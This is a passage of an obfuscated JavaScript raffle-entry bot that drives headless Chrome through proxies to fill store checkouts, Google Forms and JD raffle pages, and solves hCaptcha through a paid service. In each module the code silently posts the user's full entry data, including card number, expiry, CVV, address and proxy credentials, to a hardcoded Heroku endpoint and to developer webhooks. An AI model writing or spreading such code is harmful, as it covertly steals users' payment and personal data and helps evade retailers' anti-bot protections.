                        await _0x3b0759['type']('input[name=\x22lastName\x22]', '' + _0x399f1b[_0x33ee0e]['LastName']), await _0x4aaa24(0xc8), await _0x3b0759['type']('input[name=\x22instagramUsername\x22]', '' + _0x399f1b[_0x33ee0e]['Follower']), await _0x4aaa24(0x4b0), await _0x3b0759['click']('button.btn.continue-button__1RtsS'), await _0x4aaa24(0x3e8), console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x3b0759['select']('select[name=\x22country\x22]', '' + _0x399f1b[_0x33ee0e]['Country']), await _0x4aaa24(0x2bc), await _0x3b0759['type']('input[name=\x22streetName\x22]', '' + _0x399f1b[_0x33ee0e]['Address1']), await _0x4aaa24(0x258), await _0x3b0759['type']('input[name=\x22houseNumber\x22]', _0x399f1b[_0x33ee0e]['HouseNumber'] + '\x20' + _0x399f1b[_0x33ee0e]['Address2']), await _0x4aaa24(0xc8), await _0x3b0759['type']('input[name=\x22postalCode\x22]', '' + _0x399f1b[_0x33ee0e]['Zip']), await _0x4aaa24(0x1f4), await _0x3b0759['type']('input[name=\x22city\x22]', '' + _0x399f1b[_0x33ee0e]['City']), await _0x4aaa24(0x4b0), await _0x3b0759['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4aaa24(0x4b0), await _0x3b0759['click']('button.btn.continue-button__1RtsS'), await _0x4aaa24(0x4b0), console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x3b0759['solveRecaptchas'](), console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4aaa24(0xbb8), await _0x3b0759['click']('button.btn.continue-button__1RtsS'), await _0x4aaa24(0x1388), console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x3b0759['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3b0759['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4aaa24(0x4b0), await _0x3b0759['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x399f1b[_0x33ee0e]['CardNumber']), await _0x4aaa24(0x320), await _0x3b0759['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3b0759['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x399f1b[_0x33ee0e]['ExpiryDate']), await _0x4aaa24(0x4b0), await _0x3b0759['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3b0759['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x399f1b[_0x33ee0e]['CVV']), await _0x4aaa24(0x226), await _0x3b0759['type']('input[name=\x22holderName\x22]', '' + _0x399f1b[_0x33ee0e]['NameOnCard']), await _0x4aaa24(0x226), await _0x3b0759['click']('button.adyen-checkout__button'), console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x3b0759['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4aaa24(0xbb8);
                        } catch (_0x4e3abe) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x203DS\x20Failed')), _0x556fce = '3DS\x20Error\x20' + _0x4e3abe;
                            var _0x5e2027 = await _0xe75614(_0x399f1b[_0x33ee0e], _0x1d3e0b, 'dev', !![], _0x556fce);
                            _0x17f623['errorDEV'] = { 'embeds': [_0x5e2027] };
                            _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x17f623['errorDEV']);
                            await _0x3c4b04(_0x1dfefb, _0x17f623['errorDEV']);
                            continue;
                        }
                        _0x3265a5(_0x399f1b[_0x33ee0e], _0x1d3e0b), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x2e5e55 = _0x399f1b[_0x33ee0e];
                        try {
                            prxdata = {
                                'username': _0x1b66d2['replace']('#', ''),
                                'module': _0x1d3e0b['name'],
                                'entrydata': JSON['stringify'](_0x2e5e55),
                                'proxy': '' + _0x50d9c2[_0x33ee0e]
                            };
                            var _0x3793d9 = JSON['stringify'](prxdata);
                            let _0x581ee3 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x3793d9, _0x581ee3);
                        } catch (_0x3d4b84) {
                        }
                        if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                            try {
                                await _0x3c4b04(_0x343742['webhook'], _0x17f623['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x17f623['succesDEVMSG']), await _0x4aaa24(0xc8);
                        try {
                            await _0x3c4b04(_0x510dd4, _0x17f623['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x55d831) {
                        console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20' + _0x55d831), _0x556fce = '' + _0x55d831;
                        var _0x5e2027 = await _0xe75614(_0x399f1b[_0x33ee0e], _0x1d3e0b, 'dev', !![], _0x556fce);
                        _0x17f623['errorDEV'] = { 'embeds': [_0x5e2027] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x17f623['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x17f623['errorDEV']), _0x21fa7a = 'yes';
                    } finally {
                        _0x4c628d['close']();
                        if (_0x21fa7a == 'yes' && _0x2ae914 != 0x5) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Retrying\x20(' + _0x2ae914 + '\x20/\x205)')), _0x33ee0e = _0x33ee0e - 0x1, _0x2ae914 = _0x2ae914 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x3f20fb, _0x54f4a7, _0x57c486) {
                let _0x2d0542 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                }, _0x2d5bff = 0x0, _0x32fe10 = 0x0;
                function _0x15c56f(_0x518335) {
                    console['log'](_0x15e32e() + '\x20[' + _0x3f20fb['name'] + ']\x20Task\x20' + (_0x418255 + 0x1) + '\x20:\x20' + _0x518335);
                }
                _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x343742['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x418255 = 0x0; _0x418255 < _0x54f4a7['length']; _0x418255++) {
                    var _0x3e197a;
                    if (_0x435756 != 'yes')
                        var _0x435756 = '', _0x2e26e7 = 0x0;
                    try {
                        await _0x10409e(_0x54f4a7, _0x418255);
                    } catch {
                        _0x435756 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x54f4a7[_0x418255]['Email'] == '' || _0x54f4a7[_0x418255]['FirstName'] == '' || _0x54f4a7[_0x418255]['LastName'] == '' || _0x54f4a7[_0x418255]['Country'] == '' || _0x54f4a7[_0x418255]['Size'] == '' || _0x54f4a7[_0x418255]['Address1'] == '' || _0x54f4a7[_0x418255]['Zip'] == '') {
                        console['log'](_0x15e32e() + '\x20[' + _0x3f20fb['name'] + ']\x20Task\x20' + (_0x418255 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x343742['useRandomProxy'] = ![])
                        var _0x469972 = _0x57c486[_0x418255]['split'](':');
                    else
                        var _0x29b3ce = Math['round'](Math['random']() * (_0x57c486['length'] - 0x1)), _0x469972 = _0x57c486[_0x29b3ce]['split'](':');
                    var _0x2d7096;
                    try {
                        _0x2d7096 = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x469972[0x0] + ':' + _0x469972[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2d7096 = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x469972[0x0] + ':' + _0x469972[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        let _0xcbe9fd = { 'first': ![] };
                        const _0x5ddf72 = await _0x2d7096['newPage']();
                        await _0x5ddf72['authenticate']({
                            'username': '' + _0x469972[0x2],
                            'password': '' + _0x469972[0x3]
                        }), _0x15c56f('Getting\x20Session'), await _0x5ddf72['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5ddf72['setRequestInterception'](!![]), _0x5ddf72['on']('request', _0x381290 => {
                            _0x381290['resourceType']() === 'image' || _0x381290['resourceType']() === 'font' || _0x381290['resourceType']() === 'media' ? _0x381290['abort']() : _0x381290['continue']();
                        });
                        try {
                            await _0x5ddf72['goto'](_0x54f4a7[_0x418255]['Url'], { 'waitUntil': 'networkidle0' }), await _0x4aaa24(0xbb8), await _0x5ddf72['waitForSelector']('.teQAzf');
                        } catch (_0x56ef1f) {
                            throw new Error(_0x56ef1f);
                        }
                        let _0xefd98f = await _0x5ddf72['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                        for (question of _0xefd98f) {
                            let _0x61641a = await question['$eval']('.M7eMe', _0x3c54c3 => _0x3c54c3['textContent']);
                            if (_0x2d5bff != 0x0) {
                                let _0xd2bcc7 = ![];
                                for (let _0x347dcc = 0x0; _0x347dcc < _0x2d5bff; _0x347dcc++) {
                                    if (_0x61641a == _0x2d0542['custom' + _0x347dcc]['title']) {
                                        _0x15c56f('Custom\x20Selector\x20found;\x20' + _0x61641a);
                                        let _0x10d1a1 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0xc50de9 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x10d1a1)
                                            await _0x10d1a1['type']('' + _0x2d0542['custom' + _0x347dcc]['answer']);
                                        else
                                            _0xc50de9 && await _0xc50de9['type']('' + _0x2d0542['custom' + _0x347dcc]['answer']);
                                        _0xd2bcc7 = !![];
                                        break;
                                    }
                                }
                                if (_0xd2bcc7) {
                                    await _0x4aaa24(0x15e);
                                    continue;
                                }
                            }
                            try {
                                if (_0x61641a == _0x2d0542['0Select']['title']) {
                                    _0x15c56f('Custom\x20Selector\x20found;\x20' + _0x2d0542['0Select']['title']);
                                    let _0x3d1e28 = await question['$$']('.ulDsOb'), _0x15ae47 = await _0x3d1e28[_0x2d0542['0Select']['answer']];
                                    await _0x15ae47['click']();
                                    continue;
                                }
                                if (_0x61641a == _0x2d0542['1Select']['title']) {
                                    _0x15c56f('Custom\x20Selector\x20found;\x20' + _0x2d0542['1Select']['title']);
                                    let _0x4009f6 = await question['$$']('.ulDsOb'), _0x3a3772 = await _0x4009f6[_0x2d0542['1Select']['answer']];
                                    await _0x3a3772['click']();
                                    continue;
                                }
                                if (_0x61641a == _0x2d0542['2Select']['title']) {
                                    _0x15c56f('Custom\x20Selector\x20found;\x20' + _0x2d0542['2Select']['title']);
                                    let _0x1f89b2 = await question['$$']('.ulDsOb'), _0x4b1859 = await _0x1f89b2[_0x2d0542['2Select']['answer']];
                                    await _0x4b1859['click']();
                                    continue;
                                }
                            } catch (_0x321e23) {
                            }
                            if (_0x61641a['toLowerCase']()['includes']('mail') && !_0x61641a['toLowerCase']()['includes']('agree') || _0x61641a == _0x2d0542['Email']) {
                                _0x15c56f('Mail\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x64b2dc = await question['$']('input');
                                !_0x64b2dc && (_0x64b2dc = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                await _0x64b2dc['type'](_0x54f4a7[_0x418255]['Email']), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('first') || _0x61641a['toLowerCase']() == 'name' || _0x61641a['toLowerCase']() == 'name\x20' || _0x61641a == _0x2d0542['FirstName']) {
                                _0x15c56f('FirstName\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x39e934 = await question['$']('input');
                                !_0x39e934 && (_0x39e934 = await question['$']('textarea'));
                                await _0x39e934['type'](_0x54f4a7[_0x418255]['FirstName'] + '\x20'), await _0x4aaa24(0x258);
                                if (_0x61641a == _0x2d0542['FirstName'])
                                    continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('last') || _0x61641a['toLowerCase']()['includes']('surname') || _0x61641a == _0x2d0542['LastName']) {
                                _0x15c56f('LastName\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x15c11e = await question['$']('input');
                                !_0x15c11e && (_0x15c11e = await question['$']('textarea'));
                                await _0x15c11e['type'](_0x54f4a7[_0x418255]['LastName'] + '\x20'), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('address') && !_0x61641a['toLowerCase']()['includes']('agree') || _0x61641a == _0x2d0542['Address']) {
                                _0x15c56f('Address\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x31b246 = await question['$']('input');
                                !_0x31b246 && (_0x31b246 = await question['$']('textarea'));
                                await _0x31b246['type'](_0x54f4a7[_0x418255]['Address1'] + '\x20' + _0x54f4a7[_0x418255]['HouseNumber'] + '\x20' + _0x54f4a7[_0x418255]['Address2']), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('phone') || _0x61641a['toLowerCase']()['includes']('mobile') || _0x61641a == _0x2d0542['Phone']) {
                                _0x15c56f('Phone\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x1f50c6 = await question['$']('input');
                                !_0x1f50c6 && (_0x1f50c6 = await question['$']('textarea'));
                                await _0x1f50c6['type']('' + _0x54f4a7[_0x418255]['Phone']), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('country') || _0x61641a == _0x2d0542['Country']) {
                                let _0x1462a8 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                if (_0x1462a8) {
                                    let _0x1d77ee = ![], _0x2c4d48 = await _0x1462a8['$$']('.ulDsOb');
                                    for (option of _0x2c4d48) {
                                        let _0x463016 = await option['$']('span'), _0x101359 = await option['$eval']('span', _0x3b33b6 => _0x3b33b6['textContent']);
                                        if (_0x101359['toLowerCase']() == _0x54f4a7[_0x418255]['Country']['toLowerCase']()) {
                                            await _0x463016['click'](), _0x1d77ee = !![];
                                            break;
                                        }
                                    }
                                    if (!_0x1d77ee) {
                                        const _0x20ee6f = await question['$']('.Hvn9fb.zHQkBf');
                                        await _0x20ee6f['click'](), await _0x20ee6f['type'](_0x54f4a7[_0x418255]['Country']);
                                    }
                                    continue;
                                }
                                _0x15c56f('Country\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x280310 = await question['$']('input');
                                !_0x280310 && (_0x280310 = await question['$']('textarea'));
                                await _0x280310['type']('' + _0x54f4a7[_0x418255]['Country']), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('city') || _0x61641a == _0x2d0542['City']) {
                                _0x15c56f('City\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x9cfe29 = await question['$']('input');
                                !_0x9cfe29 && (_0x9cfe29 = await question['$']('textarea'));
                                await _0x9cfe29['type']('' + _0x54f4a7[_0x418255]['City']), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('zip') || _0x61641a == _0x2d0542['Zip']) {
                                _0x15c56f('Zip\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x10611a = await question['$']('input');
                                !_0x10611a && (_0x10611a = await question['$']('textarea'));
                                await _0x10611a['type']('' + _0x54f4a7[_0x418255]['Zip']), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('insta') || _0x61641a == _0x2d0542['Follower']) {
                                _0x15c56f('Follower\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x608259 = await question['$']('input');
                                !_0x608259 && (_0x608259 = await question['$']('textarea'));
                                await _0x608259['type']('' + _0x54f4a7[_0x418255]['Follower']), await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('size') || _0x61641a == _0x2d0542['Size']) {
                                _0x15c56f('Size\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x2c19a6 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x2c19a6) {
                                    let _0x3d20a4 = await _0x2c19a6['$$']('.ulDsOb');
                                    for (size of _0x3d20a4) {
                                        let _0x22ee87 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x1b2c8c => _0x1b2c8c['textContent']);
                                        if (_0x22ee87['toLowerCase']()['includes'](_0x54f4a7[_0x418255]['Size'])) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                let _0xf91e0b = await question['$']('.ry3kXd');
                                if (_0xf91e0b) {
                                    await _0xf91e0b['click'](), await _0x4aaa24(0x9c4);
                                    let _0x4de4c1 = await _0x5ddf72['$']('div[jsname=\x22V68bde\x22]'), _0xebb61d = await _0x4de4c1['$$']('div[jsname=\x22wQNmvb\x22]');
                                    for (size of _0xebb61d) {
                                        let _0x26d6f6 = await size['$eval']('.vRMGwf.oJeWuf', _0x5b171f => _0x5b171f['textContent']), _0x415201 = await size['$']('.vRMGwf.oJeWuf');
                                        if (_0x26d6f6['toLowerCase']()['includes'](_0x54f4a7[_0x418255]['Size'])) {
                                            await _0x4aaa24(0x190), await _0x415201['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('receive') || _0x61641a['toLowerCase']()['includes']('method')) {
                                _0x15c56f('Method\x20Selector\x20found;\x20' + _0x61641a);
                                let _0x59b8cc = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x59b8cc) {
                                    const _0x34362f = await _0x59b8cc['$$']('.ulDsOb');
                                    for (size of _0x34362f) {
                                        let _0x424213 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x14a0d6 => _0x14a0d6['textContent']);
                                        if (_0x424213['toLowerCase']()['includes']('shipping')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x4aaa24(0x258);
                                continue;
                            }
                            if (_0x61641a['toLowerCase']()['includes']('offers') || _0x61641a['toLowerCase']()['includes']('agree')) {
                                _0x15c56f('Authorization\x20Selector\x20found;\x20' + _0x61641a);
                                const _0x2e8845 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                if (_0x2e8845) {
                                    const _0x28944c = await _0x2e8845['$$']('.ulDsOb');
                                    for (size of _0x28944c) {
                                        let _0x92fc91 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x16a362 => _0x16a362['textContent']);
                                        if (_0x92fc91['toLowerCase']()['includes']('authorize') || _0x92fc91['toLowerCase']()['includes']('yes')) {
                                            await size['click']();
                                            break;
                                        }
                                    }
                                }
                                await _0x4aaa24(0x258);
                                continue;
                            }
                            async function _0x584b47() {
                                let _0x4a0e13 = await question['$']('.oyXaNc');
                                if (_0x4a0e13) {
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3f1ec6['cyan'](_0x61641a) + '\x0a');
                                    let _0x2a1b6f = await question['$$']('.ulDsOb');
                                    for (let _0x1bac90 = 0x0; _0x1bac90 < _0x2a1b6f['length']; _0x1bac90++) {
                                        let _0x5ea1b5 = await _0x2a1b6f[_0x1bac90]['$eval']('span', _0x45bd97 => _0x45bd97['textContent']);
                                        console['log']('\x20(' + _0x1bac90 + ')\x20' + _0x5ea1b5);
                                    }
                                    console['log']();
                                    let _0x26e3ee = await _0x1c1d23['get']('option'), _0x57cd70 = await _0x2a1b6f[_0x26e3ee['option']]['$eval']('span', _0x3cd482 => _0x3cd482['textContent']);
                                    _0x2d0542[_0x32fe10 + 'Select'] = {
                                        'title': _0x61641a,
                                        'answer': _0x26e3ee['option']
                                    };
                                    let _0x313097 = await _0x2a1b6f[_0x26e3ee['option']]['$']('span');
                                    await _0x313097['click'](), _0x32fe10++;
                                    return;
                                }
                                let _0x2ae5be = await question['$']('.Y6Myld');
                                if (_0x2ae5be) {
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3f1ec6['cyan'](_0x61641a) + '\x0a');
                                    let _0x247536 = await question['$$']('.ulDsOb');
                                    for (let _0x2e2345 = 0x0; _0x2e2345 < _0x247536['length']; _0x2e2345++) {
                                        let _0x3fc1e0 = await _0x247536[_0x2e2345]['$eval']('span', _0x2e41e7 => _0x2e41e7['textContent']);
                                        console['log']('\x20(' + _0x2e2345 + ')\x20' + _0x3fc1e0);
                                    }
                                    console['log']();
                                    let _0x3518d6 = await _0x1c1d23['get']('option');
                                    _0x2d0542[_0x32fe10 + 'Select'] = {
                                        'title': _0x61641a,
                                        'answer': _0x3518d6['option']['split'](',')
                                    };
                                    for (opt of _0x2d0542[_0x32fe10 + 'Select']['answer']) {
                                        let _0x136f27 = await _0x247536[opt]['$']('span');
                                        await _0x136f27['click']();
                                    }
                                    _0x32fe10++;
                                    return;
                                }
                                var _0xf5ed58 = 0x0;
                                let _0x26cb44 = Object['keys'](_0x2d0542);
                                console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3f1ec6['cyan'](_0x61641a) + '\x0a');
                                for (data of _0x26cb44) {
                                    !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0xf5ed58 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0xf5ed58 + ')\x20' + data), _0xf5ed58++;
                                }
                                console['log']('\x20(' + _0x26cb44['length'] + ')\x20Custom\x20input:'), console['log']();
                                let _0x4f92f9 = await _0x1c1d23['get']('input');
                                if (_0x4f92f9['input'] == _0x26cb44['length']) {
                                    console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                    let _0x54d8ff = await _0x1c1d23['get']('input');
                                    _0x2d0542['custom' + _0x2d5bff] = {
                                        'title': _0x61641a,
                                        'answer': _0x54d8ff['input']
                                    };
                                    let _0x378c4a = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0xd17469 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    if (_0x378c4a)
                                        await _0x378c4a['type']('' + _0x2d0542['custom' + _0x2d5bff]['answer']);
                                    else
                                        _0xd17469 && await _0xd17469['type']('' + _0x2d0542['custom' + _0x2d5bff]['answer']);
                                    _0x2d5bff++;
                                    return;
                                }
                                _0x2d0542['' + _0x26cb44[_0x4f92f9['input']]] = _0x61641a;
                                let _0x3439fb = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x14c565 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                _0x3439fb && await _0x3439fb['type']('' + _0x54f4a7[_0x418255]['' + _0x26cb44[_0x4f92f9['input']]]), _0x14c565 && await _0x14c565['type']('' + _0x54f4a7[_0x418255]['' + _0x26cb44[_0x4f92f9['input']]]), await _0x4aaa24(0x258);
                            }
                            await _0x584b47(), await _0x4aaa24(0x37a);
                        }
                        await _0x5ddf72['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x5ddf72['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x3265a5(_0x54f4a7[_0x418255], _0x3f20fb), _0x435756 = 'no';
                        var _0x4a1999 = await _0xe75614(_0x54f4a7[_0x418255], _0x3f20fb, 'dev', ![]), _0x551e62 = await _0xe75614(_0x54f4a7[_0x418255], _0x3f20fb, 'pub', ![]);
                        let _0xbb8858 = _0x54f4a7[_0x418255];
                        try {
                            prxdata = {
                                'username': _0x1b66d2['replace']('#', ''),
                                'module': _0x3f20fb['name'],
                                'entrydata': JSON['stringify'](_0xbb8858),
                                'proxy': '' + _0x57c486[_0x418255]
                            };
                            var _0x8190cc = JSON['stringify'](prxdata);
                            let _0x8fd0e3 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x8190cc, _0x8fd0e3);
                        } catch (_0x21ee9a) {
                        }
                        const _0x1824e4 = {
                            'succesDEVMSG': { 'embeds': [_0x4a1999] },
                            'succesPUBMSG': { 'embeds': [_0x551e62] }
                        };
                        try {
                            _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x1824e4['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x1824e4['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x1824e4['succesPUBMSG']);
                        } catch (_0x2562a4) {
                            console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x418255 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2562a4));
                        }
                        console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x3f20fb['name'] + ']\x20Task\x20' + (_0x418255 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                    } catch (_0x1bba72) {
                        console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x3f20fb['name'] + ']\x20Task\x20' + (_0x418255 + 0x1) + '\x20:\x20' + _0x1bba72)), _0x3e197a = '' + _0x1bba72;
                        var _0x2a05bb = await _0xe75614(_0x54f4a7[_0x418255], _0x3f20fb, 'dev', !![], _0x3e197a);
                        let _0x3edc46 = {};
                        _0x3edc46['errorDEV'] = { 'embeds': [_0x2a05bb] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x3edc46['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x3edc46['errorDEV']), _0x435756 = 'yes';
                    } finally {
                        _0x2d7096 && _0x2d7096['close']();
                        if (_0x435756 == 'yes' && _0x2e26e7 != 0x5) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x3f20fb['name'] + ']\x20Task\x20' + (_0x418255 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2e26e7 + '\x20/\x205)')), _0x418255 = _0x418255 - 0x1, _0x2e26e7 = _0x2e26e7 + 0x1;
                            continue;
                        }
                        if (_0x435756 == 'yes' && _0x2e26e7 == 0x5) {
                            _0x2e26e7 = 0x0, _0x435756 = 'no';
                            continue;
                        }
                        _0x15c56f('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x38364c, _0x330098, _0x10dfd1) {
                var _0x4a7f7d = ![], _0x386ba2 = ![];
                if (_0x343742['captchaKey'] == '' || _0x343742['captchaKey'] == undefined)
                    return console['log'](_0x3f1ec6['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x343742['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x39acaf = 0x0; _0x39acaf < _0x330098['length']; _0x39acaf++) {
                    if (_0x4d6241 != 'yes')
                        var _0x4d6241 = '', _0x4abeca = 0x0;
                    var _0x23233d, _0x58962b = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x330098[_0x39acaf]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x330098[_0x39acaf]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x1b66d2
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x343742['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3c97e2
                            }
                        ]
                    }];
